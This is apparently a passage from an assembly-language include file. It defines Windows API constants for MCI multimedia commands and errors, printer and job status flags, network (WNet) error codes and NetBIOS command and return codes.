MMIOM_RENAME equ 6
MMIOM_USER equ 8000h
SEEK_SET equ 0
SEEK_CUR equ 1
SEEK_END equ 2
MMIO_DEFAULTBUFFER equ 8192
MCIERR_INVALID_DEVICE_ID equ MCIERR_BASE+1
MCIERR_UNRECOGNIZED_KEYWORD equ MCIERR_BASE+3
MCIERR_UNRECOGNIZED_COMMAND equ MCIERR_BASE+5
MCIERR_HARDWARE equ MCIERR_BASE+6
MCIERR_INVALID_DEVICE_NAME equ MCIERR_BASE+7
MCIERR_OUT_OF_MEMORY equ MCIERR_BASE+8
MCIERR_DEVICE_OPEN equ MCIERR_BASE+9
MCIERR_CANNOT_LOAD_DRIVER equ MCIERR_BASE+10
MCIERR_MISSING_COMMAND_STRING equ MCIERR_BASE+11
MCIERR_PARAM_OVERFLOW equ MCIERR_BASE+12
MCIERR_MISSING_STRING_ARGUMENT equ MCIERR_BASE+13
MCIERR_BAD_INTEGER equ MCIERR_BASE+14
MCIERR_PARSER_INTERNAL equ MCIERR_BASE+15
MCIERR_DRIVER_INTERNAL equ MCIERR_BASE+16
MCIERR_MISSING_PARAMETER equ MCIERR_BASE+17
MCIERR_UNSUPPORTED_FUNCTION equ MCIERR_BASE+18
MCIERR_FILE_NOT_FOUND equ MCIERR_BASE+19
MCIERR_DEVICE_NOT_READY equ MCIERR_BASE+20
MCIERR_INTERNAL equ MCIERR_BASE+21
MCIERR_DRIVER equ MCIERR_BASE+22
MCIERR_CANNOT_USE_ALL equ MCIERR_BASE+23
MCIERR_MULTIPLE equ MCIERR_BASE+24
MCIERR_EXTENSION_NOT_FOUND equ MCIERR_BASE+25
MCIERR_OUTOFRANGE equ MCIERR_BASE+26
MCIERR_FLAGS_NOT_COMPATIBLE equ MCIERR_BASE+28
MCIERR_FILE_NOT_SAVED equ MCIERR_BASE+30
MCIERR_DEVICE_TYPE_REQUIRED equ MCIERR_BASE+31
MCIERR_DEVICE_LOCKED equ MCIERR_BASE+32
MCIERR_DUPLICATE_ALIAS equ MCIERR_BASE+33
MCIERR_BAD_CONSTANT equ MCIERR_BASE+34
MCIERR_MUST_USE_SHAREABLE equ MCIERR_BASE+35
MCIERR_MISSING_DEVICE_NAME equ MCIERR_BASE+36
MCIERR_BAD_TIME_FORMAT equ MCIERR_BASE+37
MCIERR_NO_CLOSING_QUOTE equ MCIERR_BASE+38
MCIERR_DUPLICATE_FLAGS equ MCIERR_BASE+39
MCIERR_INVALID_FILE equ MCIERR_BASE+40
MCIERR_NULL_PARAMETER_BLOCK equ MCIERR_BASE+41
MCIERR_UNNAMED_RESOURCE equ MCIERR_BASE+42
MCIERR_NEW_REQUIRES_ALIAS equ MCIERR_BASE+43
MCIERR_NOTIFY_ON_AUTO_OPEN equ MCIERR_BASE+44
MCIERR_NO_ELEMENT_ALLOWED equ MCIERR_BASE+45
MCIERR_NONAPPLICABLE_FUNCTION equ MCIERR_BASE+46
MCIERR_ILLEGAL_FOR_AUTO_OPEN equ MCIERR_BASE+47
MCIERR_FILENAME_REQUIRED equ MCIERR_BASE+48
MCIERR_EXTRA_CHARACTERS equ MCIERR_BASE+49
MCIERR_DEVICE_NOT_INSTALLED equ MCIERR_BASE+50
MCIERR_GET_CD equ MCIERR_BASE+51
MCIERR_SET_CD equ MCIERR_BASE+52
MCIERR_SET_DRIVE equ MCIERR_BASE+53
MCIERR_DEVICE_LENGTH equ MCIERR_BASE+54
MCIERR_DEVICE_ORD_LENGTH equ MCIERR_BASE+55
MCIERR_NO_INTEGER equ MCIERR_BASE+56
MCIERR_WAVE_OUTPUTSINUSE equ MCIERR_BASE+64
MCIERR_WAVE_SETOUTPUTINUSE equ MCIERR_BASE+65
MCIERR_WAVE_INPUTSINUSE equ MCIERR_BASE+66
MCIERR_WAVE_SETINPUTINUSE equ MCIERR_BASE+67
MCIERR_WAVE_OUTPUTUNSPECIFIED equ MCIERR_BASE+68
MCIERR_WAVE_INPUTUNSPECIFIED equ MCIERR_BASE+69
MCIERR_WAVE_OUTPUTSUNSUITABLE equ MCIERR_BASE+70
MCIERR_WAVE_SETOUTPUTUNSUITABLE equ MCIERR_BASE+71
MCIERR_WAVE_INPUTSUNSUITABLE equ MCIERR_BASE+72
MCIERR_WAVE_SETINPUTUNSUITABLE equ MCIERR_BASE+73
MCIERR_SEQ_DIV_INCOMPATIBLE equ MCIERR_BASE+80
MCIERR_SEQ_PORT_INUSE equ MCIERR_BASE+81
MCIERR_SEQ_PORT_NONEXISTENT equ MCIERR_BASE+82
MCIERR_SEQ_PORT_MAPNODEVICE equ MCIERR_BASE+83
MCIERR_SEQ_PORT_MISCERROR equ MCIERR_BASE+84
MCIERR_SEQ_TIMER equ MCIERR_BASE+85
MCIERR_SEQ_PORTUNSPECIFIED equ MCIERR_BASE+86
MCIERR_SEQ_NOMIDIPRESENT equ MCIERR_BASE+87
MCIERR_NO_WINDOW equ MCIERR_BASE+90
MCIERR_CREATEWINDOW equ MCIERR_BASE+91
MCIERR_FILE_READ equ MCIERR_BASE+92
MCIERR_FILE_WRITE equ MCIERR_BASE+93
MCIERR_CUSTOM_DRIVER_BASE equ MCIERR_BASE+256
MCI_FIRST equ 800h
MCI_OPEN equ 803h
MCI_CLOSE equ 804h
MCI_ESCAPE equ 805h
MCI_PLAY equ 806h
MCI_SEEK equ 807h
MCI_STOP equ 808h
MCI_PAUSE equ 809h
MCI_INFO equ 80Ah
MCI_GETDEVCAPS equ 80Bh
MCI_SPIN equ 80Ch
MCI_SET equ 80Dh
MCI_STEP equ 80Eh
MCI_RECORD equ 80Fh
MCI_SYSINFO equ 810h
MCI_BREAK equ 811h
MCI_SOUND equ 812h
MCI_SAVE equ 813h
MCI_STATUS equ 814h
MCI_CUE equ 830h
MCI_REALIZE equ 840h
MCI_WINDOW equ 841h
MCI_PUT equ 842h
MCI_WHERE equ 843h
MCI_FREEZE equ 844h
MCI_UNFREEZE equ 845h
MCI_LOAD equ 850h
MCI_CUT equ 851h
MCI_COPY equ 852h
MCI_PASTE equ 853h
MCI_UPDATE equ 854h
MCI_RESUME equ 855h
MCI_DELETE equ 856h
MCI_LAST equ 0FFFh
MCI_USER_MESSAGES equ 400h+MCI_FIRST
MCI_ALL_DEVICE_ID equ -1
MCI_DEVTYPE_VCR equ 513
MCI_DEVTYPE_VIDEODISC equ 514
MCI_DEVTYPE_OVERLAY equ 515
MCI_DEVTYPE_CD_AUDIO equ 516
MCI_DEVTYPE_DAT equ 517
MCI_DEVTYPE_SCANNER equ 518
MCI_DEVTYPE_ANIMATION equ 519
MCI_DEVTYPE_DIGITAL_VIDEO equ 520
MCI_DEVTYPE_OTHER equ 521
MCI_DEVTYPE_WAVEFORM_AUDIO equ 522
MCI_DEVTYPE_SEQUENCER equ 523
MCI_DEVTYPE_FIRST equ MCI_DEVTYPE_VCR
MCI_DEVTYPE_LAST equ MCI_DEVTYPE_SEQUENCER
MCI_DEVTYPE_FIRST_USER equ 1000h
MCI_MODE_NOT_READY equ MCI_STRING_OFFSET+12
MCI_MODE_STOP equ MCI_STRING_OFFSET+13
MCI_MODE_PLAY equ MCI_STRING_OFFSET+14
MCI_MODE_RECORD equ MCI_STRING_OFFSET+15
MCI_MODE_SEEK equ MCI_STRING_OFFSET+16
MCI_MODE_PAUSE equ MCI_STRING_OFFSET+17
MCI_MODE_OPEN equ MCI_STRING_OFFSET+18
MCI_FORMAT_MILLISECONDS equ 0
MCI_FORMAT_HMS equ 1
MCI_FORMAT_MSF equ 2
MCI_FORMAT_FRAMES equ 3
MCI_FORMAT_SMPTE_24 equ 4
MCI_FORMAT_SMPTE_25 equ 5
MCI_FORMAT_SMPTE_30 equ 6
MCI_FORMAT_SMPTE_30DROP equ 7
MCI_FORMAT_BYTES equ 8
MCI_FORMAT_SAMPLES equ 9
MCI_FORMAT_TMSF equ 10
MCI_NOTIFY_SUCCESSFUL equ 1h
MCI_NOTIFY_SUPERSEDED equ 2h
MCI_NOTIFY_ABORTED equ 4h
MCI_NOTIFY_FAILURE equ 8h
MCI_NOTIFY equ 1h
MCI_WAIT equ 2h
MCI_FROM equ 4h
MCI_TO equ 8h
MCI_TRACK equ 10h
MCI_OPEN_SHAREABLE equ 100h
MCI_OPEN_ELEMENT equ 200h
MCI_OPEN_ALIAS equ 400h
MCI_OPEN_ELEMENT_ID equ 800h
MCI_OPEN_TYPE_ID equ 1000h
MCI_OPEN_TYPE equ 2000h
MCI_SEEK_TO_START equ 100h
MCI_SEEK_TO_END equ 200h
MCI_STATUS_ITEM equ 100h
MCI_STATUS_START equ 200h
MCI_STATUS_LENGTH equ 1h
MCI_STATUS_POSITION equ 2h
MCI_STATUS_NUMBER_OF_TRACKS equ 3h
MCI_STATUS_MODE equ 4h
MCI_STATUS_MEDIA_PRESENT equ 5h
MCI_STATUS_TIME_FORMAT equ 6h
MCI_STATUS_READY equ 7h
MCI_STATUS_CURRENT_TRACK equ 8h
MCI_INFO_PRODUCT equ 100h
MCI_INFO_FILE equ 200h
MCI_GETDEVCAPS_ITEM equ 100h
MCI_GETDEVCAPS_CAN_RECORD equ 1h
MCI_GETDEVCAPS_HAS_AUDIO equ 2h
MCI_GETDEVCAPS_HAS_VIDEO equ 3h
MCI_GETDEVCAPS_DEVICE_TYPE equ 4h
MCI_GETDEVCAPS_USES_FILES equ 5h
MCI_GETDEVCAPS_COMPOUND_DEVICE equ 6h
MCI_GETDEVCAPS_CAN_EJECT equ 7h
MCI_GETDEVCAPS_CAN_PLAY equ 8h
MCI_GETDEVCAPS_CAN_SAVE equ 9h
MCI_SYSINFO_QUANTITY equ 100h
MCI_SYSINFO_OPEN equ 200h
MCI_SYSINFO_NAME equ 400h
MCI_SYSINFO_INSTALLNAME equ 800h
MCI_SET_DOOR_OPEN equ 100h
MCI_SET_DOOR_CLOSED equ 200h
MCI_SET_TIME_FORMAT equ 400h
MCI_SET_AUDIO equ 800h
MCI_SET_VIDEO equ 1000h
MCI_SET_ON equ 2000h
MCI_SET_OFF equ 4000h
MCI_SET_AUDIO_ALL equ 4001h
MCI_SET_AUDIO_LEFT equ 4002h
MCI_SET_AUDIO_RIGHT equ 4003h
MCI_BREAK_KEY equ 100h
MCI_BREAK_HWND equ 200h
MCI_BREAK_OFF equ 400h
MCI_RECORD_INSERT equ 100h
MCI_RECORD_OVERWRITE equ 200h
MCI_SOUND_NAME equ 100h
MCI_SAVE_FILE equ 100h
MCI_LOAD_FILE equ 100h
MCI_VD_MODE_PARK equ MCI_VD_OFFSET+1
MCI_VD_MEDIA_CLV equ MCI_VD_OFFSET+2
MCI_VD_MEDIA_CAV equ MCI_VD_OFFSET+3
MCI_VD_MEDIA_OTHER equ MCI_VD_OFFSET+4
MCI_VD_FORMAT_TRACK equ 4001h
MCI_VD_PLAY_REVERSE equ 10000h
MCI_VD_PLAY_FAST equ 20000h
MCI_VD_PLAY_SPEED equ 40000h
MCI_VD_PLAY_SCAN equ 80000h
MCI_VD_PLAY_SLOW equ 100000h
MCI_VD_SEEK_REVERSE equ 10000h
MCI_VD_STATUS_SPEED equ 4002h
MCI_VD_STATUS_FORWARD equ 4003h
MCI_VD_STATUS_MEDIA_TYPE equ 4004h
MCI_VD_STATUS_SIDE equ 4005h
MCI_VD_STATUS_DISC_SIZE equ 4006h
MCI_VD_GETDEVCAPS_CLV equ 10000h
MCI_VD_GETDEVCAPS_CAV equ 20000h
MCI_VD_SPIN_UP equ 10000h
MCI_VD_SPIN_DOWN equ 20000h
MCI_VD_GETDEVCAPS_CAN_REVERSE equ 4002h
MCI_VD_GETDEVCAPS_FAST_RATE equ 4003h
MCI_VD_GETDEVCAPS_SLOW_RATE equ 4004h
MCI_VD_GETDEVCAPS_NORMAL_RATE equ 4005h
MCI_VD_STEP_FRAMES equ 10000h
MCI_VD_STEP_REVERSE equ 20000h
MCI_VD_ESCAPE_STRING equ 100h
MCI_WAVE_PCM equ MCI_WAVE_OFFSET+0
MCI_WAVE_MAPPER equ MCI_WAVE_OFFSET+1
MCI_WAVE_OPEN_BUFFER equ 10000h
MCI_WAVE_SET_FORMATTAG equ 10000h
MCI_WAVE_SET_CHANNELS equ 20000h
MCI_WAVE_SET_SAMPLESPERSEC equ 40000h
MCI_WAVE_SET_AVGBYTESPERSEC equ 80000h
MCI_WAVE_SET_BLOCKALIGN equ 100000h
MCI_WAVE_SET_BITSPERSAMPLE equ 200000h
MCI_WAVE_INPUT equ 400000h
MCI_WAVE_OUTPUT equ 800000h
MCI_WAVE_STATUS_FORMATTAG equ 4001h
MCI_WAVE_STATUS_CHANNELS equ 4002h
MCI_WAVE_STATUS_SAMPLESPERSEC equ 4003h
MCI_WAVE_STATUS_AVGBYTESPERSEC equ 4004h
MCI_WAVE_STATUS_BLOCKALIGN equ 4005h
MCI_WAVE_STATUS_BITSPERSAMPLE equ 4006h
MCI_WAVE_STATUS_LEVEL equ 4007h
MCI_WAVE_SET_ANYINPUT equ 4000000h
MCI_WAVE_SET_ANYOUTPUT equ 8000000h
MCI_WAVE_GETDEVCAPS_INPUTS equ 4001h
MCI_WAVE_GETDEVCAPS_OUTPUTS equ 4002h
MCI_SEQ_DIV_PPQN equ 0+MCI_SEQ_OFFSET
MCI_SEQ_DIV_SMPTE_24 equ 1+MCI_SEQ_OFFSET
MCI_SEQ_DIV_SMPTE_25 equ 2+MCI_SEQ_OFFSET
MCI_SEQ_DIV_SMPTE_30DROP equ 3+MCI_SEQ_OFFSET
MCI_SEQ_DIV_SMPTE_30 equ 4+MCI_SEQ_OFFSET
MCI_SEQ_FORMAT_SONGPTR equ 4001h
MCI_SEQ_FILE equ 4002h
MCI_SEQ_MIDI equ 4003h
MCI_SEQ_SMPTE equ 4004h
MCI_SEQ_NONE equ 65533
MCI_SEQ_MAPPER equ 65535
MCI_SEQ_STATUS_TEMPO equ 4002h
MCI_SEQ_STATUS_PORT equ 4003h
MCI_SEQ_STATUS_SLAVE equ 4007h
MCI_SEQ_STATUS_MASTER equ 4008h
MCI_SEQ_STATUS_OFFSET equ 4009h
MCI_SEQ_STATUS_DIVTYPE equ 400Ah
MCI_SEQ_SET_TEMPO equ 10000h
MCI_SEQ_SET_PORT equ 20000h
MCI_SEQ_SET_SLAVE equ 40000h
MCI_SEQ_SET_MASTER equ 80000h
MCI_SEQ_SET_OFFSET equ 1000000h
MCI_ANIM_OPEN_WS equ 10000h
MCI_ANIM_OPEN_PARENT equ 20000h
MCI_ANIM_OPEN_NOSTATIC equ 40000h
MCI_ANIM_PLAY_SPEED equ 10000h
MCI_ANIM_PLAY_REVERSE equ 20000h
MCI_ANIM_PLAY_FAST equ 40000h
MCI_ANIM_PLAY_SLOW equ 80000h
MCI_ANIM_PLAY_SCAN equ 100000h
MCI_ANIM_STEP_REVERSE equ 10000h
MCI_ANIM_STEP_FRAMES equ 20000h
MCI_ANIM_STATUS_SPEED equ 4001h
MCI_ANIM_STATUS_FORWARD equ 4002h
MCI_ANIM_STATUS_HWND equ 4003h
MCI_ANIM_STATUS_HPAL equ 4004h
MCI_ANIM_STATUS_STRETCH equ 4005h
MCI_ANIM_INFO_TEXT equ 10000h
MCI_ANIM_GETDEVCAPS_CAN_REVERSE equ 4001h
MCI_ANIM_GETDEVCAPS_FAST_RATE equ 4002h
MCI_ANIM_GETDEVCAPS_SLOW_RATE equ 4003h
MCI_ANIM_GETDEVCAPS_NORMAL_RATE equ 4004h
MCI_ANIM_GETDEVCAPS_PALETTES equ 4006h
MCI_ANIM_GETDEVCAPS_CAN_STRETCH equ 4007h
MCI_ANIM_GETDEVCAPS_MAX_WINDOWS equ 4008h
MCI_ANIM_REALIZE_NORM equ 10000h
MCI_ANIM_REALIZE_BKGD equ 20000h
MCI_ANIM_WINDOW_HWND equ 10000h
MCI_ANIM_WINDOW_STATE equ 40000h
MCI_ANIM_WINDOW_TEXT equ 80000h
MCI_ANIM_WINDOW_ENABLE_STRETCH equ 100000h
MCI_ANIM_WINDOW_DISABLE_STRETCH equ 200000h
MCI_ANIM_WINDOW_DEFAULT equ 0h
MCI_ANIM_RECT equ 10000h
MCI_ANIM_PUT_SOURCE equ 20000h
MCI_ANIM_PUT_DESTINATION equ 40000h
MCI_ANIM_WHERE_SOURCE equ 20000h
MCI_ANIM_WHERE_DESTINATION equ 40000h
MCI_ANIM_UPDATE_HDC equ 20000h
MCI_OVLY_OPEN_WS equ 10000h
MCI_OVLY_OPEN_PARENT equ 20000h
MCI_OVLY_STATUS_HWND equ 4001h
MCI_OVLY_STATUS_STRETCH equ 4002h
MCI_OVLY_INFO_TEXT equ 10000h
MCI_OVLY_GETDEVCAPS_CAN_STRETCH equ 4001h
MCI_OVLY_GETDEVCAPS_CAN_FREEZE equ 4002h
MCI_OVLY_GETDEVCAPS_MAX_WINDOWS equ 4003h
MCI_OVLY_WINDOW_HWND equ 10000h
MCI_OVLY_WINDOW_STATE equ 40000h
MCI_OVLY_WINDOW_TEXT equ 80000h
MCI_OVLY_WINDOW_ENABLE_STRETCH equ 100000h
MCI_OVLY_WINDOW_DISABLE_STRETCH equ 200000h
MCI_OVLY_WINDOW_DEFAULT equ 0h
MCI_OVLY_RECT equ 10000h
MCI_OVLY_PUT_SOURCE equ 20000h
MCI_OVLY_PUT_DESTINATION equ 40000h
MCI_OVLY_PUT_FRAME equ 80000h
MCI_OVLY_PUT_VIDEO equ 100000h
MCI_OVLY_WHERE_SOURCE equ 20000h
MCI_OVLY_WHERE_DESTINATION equ 40000h
MCI_OVLY_WHERE_FRAME equ 80000h
MCI_OVLY_WHERE_VIDEO equ 100000h
CAPS1 equ 94
C1_TRANSPARENT equ 1h
NEWTRANSPARENT equ 3
QUERYROPSUPPORT equ 40
SELECTDIB equ 41
SE_ERR_SHARE equ 26
SE_ERR_ASSOCINCOMPLETE equ 27
SE_ERR_DDETIMEOUT equ 28
SE_ERR_DDEFAIL equ 29
SE_ERR_DDEBUSY equ 30
SE_ERR_NOASSOC equ 31
PRINTER_CONTROL_PAUSE equ 1
PRINTER_CONTROL_RESUME equ 2
PRINTER_CONTROL_PURGE equ 3
PRINTER_STATUS_PAUSED equ 1h
PRINTER_STATUS_ERROR equ 2h
PRINTER_STATUS_PENDING_DELETION equ 4h
PRINTER_STATUS_PAPER_JAM equ 8h
PRINTER_STATUS_PAPER_OUT equ 10h
PRINTER_STATUS_MANUAL_FEED equ 20h
PRINTER_STATUS_PAPER_PROBLEM equ 40h
PRINTER_STATUS_OFFLINE equ 80h
PRINTER_STATUS_IO_ACTIVE equ 100h
PRINTER_STATUS_BUSY equ 200h
PRINTER_STATUS_PRINTING equ 400h
PRINTER_STATUS_OUTPUT_BIN_FULL equ 800h
PRINTER_STATUS_NOT_AVAILABLE equ 1000h
PRINTER_STATUS_WAITING equ 2000h
PRINTER_STATUS_PROCESSING equ 4000h
PRINTER_STATUS_INITIALIZING equ 8000h
PRINTER_STATUS_WARMING_UP equ 10000h
PRINTER_STATUS_TONER_LOW equ 20000h
PRINTER_STATUS_NO_TONER equ 40000h
PRINTER_STATUS_PAGE_PUNT equ 80000h
PRINTER_STATUS_USER_INTERVENTION equ 100000h
PRINTER_STATUS_OUT_OF_MEMORY equ 200000h
PRINTER_STATUS_DOOR_OPEN equ 400000h
PRINTER_ATTRIBUTE_QUEUED equ 1h
PRINTER_ATTRIBUTE_DIRECT equ 2h
PRINTER_ATTRIBUTE_DEFAULT equ 4h
PRINTER_ATTRIBUTE_SHARED equ 8h
PRINTER_ATTRIBUTE_NETWORK equ 10h
PRINTER_ATTRIBUTE_HIDDEN equ 20h
PRINTER_ATTRIBUTE_LOCAL equ 40h
NO_PRIORITY equ 0
MAX_PRIORITY equ 99
MIN_PRIORITY equ 1
DEF_PRIORITY equ 1
JOB_CONTROL_PAUSE equ 1
JOB_CONTROL_RESUME equ 2
JOB_CONTROL_CANCEL equ 3
JOB_CONTROL_RESTART equ 4
JOB_STATUS_PAUSED equ 1h
JOB_STATUS_ERROR equ 2h
JOB_STATUS_DELETING equ 4h
JOB_STATUS_SPOOLING equ 8h
JOB_STATUS_PRINTING equ 10h
JOB_STATUS_OFFLINE equ 20h
JOB_STATUS_PAPEROUT equ 40h
JOB_STATUS_PRINTED equ 80h
JOB_POSITION_UNSPECIFIED equ 0
FORM_BUILTIN equ 1h
PRINTER_CONTROL_SET_STATUS equ 4
PRINTER_ATTRIBUTE_WORK_OFFLINE equ 400h
PRINTER_ATTRIBUTE_ENABLE_BIDI equ 800h
JOB_CONTROL_DELETE equ 5
JOB_STATUS_USER_INTERVENTION equ 10000h
DI_CHANNEL equ 1
DI_READ_SPOOL_JOB equ 3
PORT_TYPE_WRITE equ 1h
PORT_TYPE_READ equ 2h
PORT_TYPE_REDIRECTED equ 4h
PORT_TYPE_NET_ATTACHED equ 8h
PRINTER_ENUM_DEFAULT equ 1h
PRINTER_ENUM_LOCAL equ 2h
PRINTER_ENUM_CONNECTIONS equ 4h
PRINTER_ENUM_FAVORITE equ 4h
PRINTER_ENUM_NAME equ 8h
PRINTER_ENUM_REMOTE equ 10h
PRINTER_ENUM_SHARED equ 20h
PRINTER_ENUM_NETWORK equ 40h
PRINTER_ENUM_EXPAND equ 4000h
PRINTER_ENUM_CONTAINER equ 8000h
PRINTER_ENUM_ICONMASK equ 0FF0000h
PRINTER_ENUM_ICON1 equ 10000h
PRINTER_ENUM_ICON2 equ 20000h
PRINTER_ENUM_ICON3 equ 40000h
PRINTER_ENUM_ICON4 equ 80000h
PRINTER_ENUM_ICON5 equ 100000h
PRINTER_ENUM_ICON6 equ 200000h
PRINTER_ENUM_ICON7 equ 400000h
PRINTER_ENUM_ICON8 equ 800000h
PRINTER_CHANGE_ADD_PRINTER equ 1h
PRINTER_CHANGE_SET_PRINTER equ 2h
PRINTER_CHANGE_DELETE_PRINTER equ 4h
PRINTER_CHANGE_PRINTER equ 0FFh
PRINTER_CHANGE_ADD_JOB equ 100h
PRINTER_CHANGE_SET_JOB equ 200h
PRINTER_CHANGE_DELETE_JOB equ 400h
PRINTER_CHANGE_WRITE_JOB equ 800h
PRINTER_CHANGE_JOB equ 0FF00h
PRINTER_CHANGE_ADD_FORM equ 10000h
PRINTER_CHANGE_SET_FORM equ 20000h
PRINTER_CHANGE_DELETE_FORM equ 40000h
PRINTER_CHANGE_FORM equ 70000h
PRINTER_CHANGE_ADD_PORT equ 100000h
PRINTER_CHANGE_CONFIGURE_PORT equ 200000h
PRINTER_CHANGE_DELETE_PORT equ 400000h
PRINTER_CHANGE_PORT equ 700000h
PRINTER_CHANGE_ADD_PRINT_PROCESSOR equ 1000000h
PRINTER_CHANGE_DELETE_PRINT_PROCESSOR equ 4000000h
PRINTER_CHANGE_PRINT_PROCESSOR equ 7000000h
PRINTER_CHANGE_ADD_PRINTER_DRIVER equ 10000000h
PRINTER_CHANGE_DELETE_PRINTER_DRIVER equ 40000000h
PRINTER_CHANGE_PRINTER_DRIVER equ 70000000h
PRINTER_CHANGE_TIMEOUT equ 80000000h
PRINTER_CHANGE_ALL equ 7777FFFFh
PRINTER_ERROR_INFORMATION equ 80000000h
PRINTER_ERROR_WARNING equ 40000000h
PRINTER_ERROR_SEVERE equ 20000000h
PRINTER_ERROR_OUTOFPAPER equ 1h
PRINTER_ERROR_JAM equ 2h
PRINTER_ERROR_OUTOFTONER equ 4h
SERVER_ACCESS_ADMINISTER equ 1h
SERVER_ACCESS_ENUMERATE equ 2h
PRINTER_ACCESS_ADMINISTER equ 4h
PRINTER_ACCESS_USE equ 8h
JOB_ACCESS_ADMINISTER equ 10h
SERVER_ALL_ACCESS equ STANDARD_RIGHTS_REQUIRED|SERVER_ACCESS_ADMINISTER|SERVER_ACCESS_ENUMERATE
SERVER_READ equ STANDARD_RIGHTS_READ|SERVER_ACCESS_ENUMERATE
SERVER_WRITE equ STANDARD_RIGHTS_WRITE|SERVER_ACCESS_ADMINISTER|SERVER_ACCESS_ENUMERATE
SERVER_EXECUTE equ STANDARD_RIGHTS_EXECUTE|SERVER_ACCESS_ENUMERATE
PRINTER_ALL_ACCESS equ STANDARD_RIGHTS_REQUIRED|PRINTER_ACCESS_ADMINISTER|PRINTER_ACCESS_USE
PRINTER_READ equ STANDARD_RIGHTS_READ|PRINTER_ACCESS_USE
PRINTER_WRITE equ STANDARD_RIGHTS_WRITE|PRINTER_ACCESS_USE
PRINTER_EXECUTE equ STANDARD_RIGHTS_EXECUTE|PRINTER_ACCESS_USE
JOB_ALL_ACCESS equ STANDARD_RIGHTS_REQUIRED|JOB_ACCESS_ADMINISTER
JOB_READ equ STANDARD_RIGHTS_READ|JOB_ACCESS_ADMINISTER
JOB_WRITE equ STANDARD_RIGHTS_WRITE|JOB_ACCESS_ADMINISTER
JOB_EXECUTE equ STANDARD_RIGHTS_EXECUTE|JOB_ACCESS_ADMINISTER
RESOURCE_CONNECTED equ 1h
RESOURCE_PUBLICNET equ 2h
RESOURCE_GLOBALNET equ 2h
RESOURCE_REMEMBERED equ 3h
RESOURCE_RECENT equ 4h
RESOURCE_CONTEXT equ 5h
RESOURCETYPE_ANY equ 0h
RESOURCETYPE_DISK equ 1h
RESOURCETYPE_PRINT equ 2h
RESOURCETYPE_UNKNOWN equ 0FFFFh
RESOURCEUSAGE_CONNECTABLE equ 1h
RESOURCEUSAGE_CONTAINER equ 2h
RESOURCEUSAGE_RESERVED equ 80000000h
RESOURCEDISPLAYTYPE_GENERIC equ 0h
RESOURCEDISPLAYTYPE_DOMAIN equ 1h
RESOURCEDISPLAYTYPE_SERVER equ 2h
RESOURCEDISPLAYTYPE_SHARE equ 3h
RESOURCEDISPLAYTYPE_FILE equ 4h
RESOURCEDISPLAYTYPE_GROUP equ 5h
CONNECT_UPDATE_PROFILE equ 1h
WN_SUCCESS equ NO_ERROR
WN_NOT_SUPPORTED equ ERROR_NOT_SUPPORTED
WN_NET_ERROR equ ERROR_UNEXP_NET_ERR
WN_MORE_DATA equ ERROR_MORE_DATA
WN_BAD_POINTER equ ERROR_INVALID_ADDRESS
WN_BAD_VALUE equ ERROR_INVALID_PARAMETER
WN_BAD_PASSWORD equ ERROR_INVALID_PASSWORD
WN_ACCESS_DENIED equ ERROR_ACCESS_DENIED
WN_FUNCTION_BUSY equ ERROR_BUSY
WN_WINDOWS_ERROR equ ERROR_UNEXP_NET_ERR
WN_BAD_USER equ ERROR_BAD_USERNAME
WN_OUT_OF_MEMORY equ ERROR_NOT_ENOUGH_MEMORY
WN_NO_NETWORK equ ERROR_NO_NETWORK
WN_EXTENDED_ERROR equ ERROR_EXTENDED_ERROR
WN_NOT_CONNECTED equ ERROR_NOT_CONNECTED
WN_OPEN_FILES equ ERROR_OPEN_FILES
WN_DEVICE_IN_USE equ ERROR_DEVICE_IN_USE
WN_BAD_NETNAME equ ERROR_BAD_NET_NAME
WN_BAD_LOCALNAME equ ERROR_BAD_DEVICE
WN_ALREADY_CONNECTED equ ERROR_ALREADY_ASSIGNED
WN_DEVICE_ERROR equ ERROR_GEN_FAILURE
WN_CONNECTION_CLOSED equ ERROR_CONNECTION_UNAVAIL
WN_NO_NET_OR_BAD_PATH equ ERROR_NO_NET_OR_BAD_PATH
WN_BAD_PROVIDER equ ERROR_BAD_PROVIDER
WN_CANNOT_OPEN_PROFILE equ ERROR_CANNOT_OPEN_PROFILE
WN_BAD_PROFILE equ ERROR_BAD_PROFILE
WN_BAD_HANDLE equ ERROR_INVALID_HANDLE
WN_NO_MORE_ENTRIES equ ERROR_NO_MORE_ITEMS
WN_NOT_CONTAINER equ ERROR_NOT_CONTAINER
WN_NO_ERROR equ NO_ERROR
NCBNAMSZ equ 16
MAX_LANA equ 254
NAME_FLAGS_MASK equ 87h
GROUP_NAME equ 80h
UNIQUE_NAME equ 0h
REGISTERING equ 0h
REGISTERED equ 4h
DEREGISTERED equ 5h
DUPLICATE equ 6h
DUPLICATE_DEREG equ 7h
LISTEN_OUTSTANDING equ 1h
CALL_PENDING equ 2h
SESSION_ESTABLISHED equ 3h
HANGUP_PENDING equ 4h
HANGUP_COMPLETE equ 5h
SESSION_ABORTED equ 6h
NCBCALL equ 10h
NCBLISTEN equ 11h
NCBHANGUP equ 12h
NCBSEND equ 14h
NCBRECV equ 15h
NCBRECVANY equ 16h
NCBCHAINSEND equ 17h
NCBDGSEND equ 20h
NCBDGRECV equ 21h
NCBDGSENDBC equ 22h
NCBDGRECVBC equ 23h
NCBADDNAME equ 30h
NCBDELNAME equ 31h
NCBRESET equ 32h
NCBASTAT equ 33h
NCBSSTAT equ 34h
NCBCANCEL equ 35h
NCBADDGRNAME equ 36h
NCBENUM equ 37h
NCBUNLINK equ 70h
NCBSENDNA equ 71h
NCBCHAINSENDNA equ 72h
NCBLANSTALERT equ 73h
NCBACTION equ 77h
NCBFINDNAME equ 78h
NCBTRACE equ 79h
ASYNCH equ 80h
NRC_GOODRET equ 0h
NRC_BUFLEN equ 1h
NRC_ILLCMD equ 3h
NRC_CMDTMO equ 5h
NRC_INCOMP equ 6h
NRC_BADDR equ 7h
NRC_SNUMOUT equ 8h
NRC_NORES equ 9h
NRC_SCLOSED equ 0Ah
NRC_CMDCAN equ 0Bh
NRC_DUPNAME equ 0Dh
NRC_NAMTFUL equ 0Eh
NRC_ACTSES equ 0Fh
NRC_LOCTFUL equ 11h
NRC_REMTFUL equ 12h
NRC_ILLNN equ 13h
NRC_NOCALL equ 14h
NRC_NOWILD equ 15h
NRC_INUSE equ 16h
NRC_NAMERR equ 17h
NRC_SABORT equ 18h
NRC_NAMCONF equ 19h
NRC_IFBUSY equ 21h
NRC_TOOMANY equ 22h
NRC_BRIDGE equ 23h
NRC_CANOCCR equ 24h
NRC_CANCEL equ 26h
NRC_DUPENV equ 30h
NRC_ENVNOTDEF equ 34h
NRC_OSRESNOTAV equ 35h
NRC_MAXAPPS equ 36h
NRC_NOSAPS equ 37h
